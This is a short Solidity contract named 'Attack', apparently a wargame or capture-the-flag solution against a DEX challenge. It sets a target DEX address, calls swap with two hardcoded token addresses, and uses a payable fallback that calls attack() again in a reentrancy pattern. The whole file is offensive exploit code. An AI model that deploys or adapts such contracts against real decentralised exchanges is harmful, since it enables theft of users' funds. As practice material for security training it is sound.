// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Dex {
    function swap(address from, address to, uint amount) external;

} 

contract Attack {
address public reentrancyAddress;
Dex public ab;
Dex public bc;

function setAddress (address payable _addr) public {
    reentrancyAddress = _addr;
    ab = Dex(reentrancyAddress);
}

function attack() public {
    ab.swap(address(0xF928f96aB068bdE671FE74E415f73539a5F58bF3), address(0x26757bfDF61275e4b1EB264A7d1f057d4aF26bF2), 10);

}

fallback() external payable {
  attack();
}
 
}